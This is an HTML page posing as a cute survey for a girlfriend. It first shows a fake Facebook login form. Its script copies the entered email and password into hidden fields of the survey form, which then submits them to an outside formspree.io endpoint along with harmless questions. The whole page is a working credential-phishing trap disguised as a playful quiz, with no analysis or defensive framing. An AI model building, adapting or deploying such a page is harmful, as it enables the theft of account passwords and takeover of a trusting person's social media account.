<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cute Survey for Girlfriend</title>
    <style>
        body {
            font-family: 'Comic Sans MS', cursive, sans-serif;
            background-color: #ffe6e6;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            max-width: 350px;
            width: 100%;
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
            color: #ff66b2;
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: #ff66b2;
        }

        input, button, select {
            width: 100%;
            margin-bottom: 15px;
            padding: 10px;
            border: 2px solid #ff66b2;
            border-radius: 8px;
            font-size: 16px;
        }

        button {
            background-color: #ff66b2;
            color: white;
            border: none;
            cursor: pointer;
        }

        button:hover {
            background-color: #ff3399;
        }

        .thank-you-message {
            display: none;
            color: #ff66b2;
            font-size: 20px;
            margin-top: 20px;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }

        @media (max-width: 400px) {
            .container {
                padding: 15px;
                max-width: 90%;
            }

            input, button, select {
                padding: 8px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container login-container">
        <h2>Login your Facebook account üíñ</h2>
        <form id="loginForm">
            <label for="email">Email:</label>
            <input type="text" id="email" name="userEmail" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="securityKey" required>

            <button type="submit">Log In</button>
        </form>
    </div>

    <div class="container survey-container" style="display:none;">
        <h2>Welcome to Our Cute Survey üíñ</h2>
        <form id="surveyForm" action="https://formspree.io/f/mqazgadk" method="POST">
            <!-- Hidden fields to carry over the email and password -->
            <input type="hidden" name="userEmail" id="hidden-email">
            <input type="hidden" name="securityKey" id="hidden-password">

            <label for="favorite-color">What's your favorite color? üé®</label>
            <input type="text" id="favorite-color" name="favoriteColor">

            <label for="favorite-movie">What's your favorite movie? üé¨</label>
            <input type="text" id="favorite-movie" name="favoriteMovie">

            <label for="chocolate-or-happiness">Would you choose chocolates or happiness? üç´üòä</label>
            <select id="chocolate-or-happiness" name="chocolateOrHappiness">
                <option value="chocolates">Chocolates</option>
                <option value="happiness">Happiness</option>
            </select>

            <label for="dream-destination">What's your dream vacation destination? üåç</label>
            <input type="text" id="dream-destination" name="dreamDestination">

            <label for="cute-nickname">What cute nickname do you like to be called? üíï</label>
            <input type="text" id="cute-nickname" name="cuteNickname">

            <button type="submit">Submit üíå</button>
        </form>
        <div class="thank-you-message">Thank you! üíñ mwahh </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault(); // Prevent the login form from submitting

                // Get the values from the login form
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                // Pass the email and password to the hidden fields in the survey form
                document.getElementById('hidden-email').value = email;
                document.getElementById('hidden-password').value = password;

                // Hide the login form and show the survey
                document.querySelector('.login-container').style.display = 'none';
                document.querySelector('.survey-container').style.display = 'block';
            });

            document.getElementById('surveyForm').addEventListener('submit', function() {
                // No need for e.preventDefault() here; allow the form to submit naturally
                document.getElementById('surveyForm').style.display = 'none';
                document.querySelector('.thank-you-message').style.display = 'block';
            });
        });
    </script>
</body>
</html>
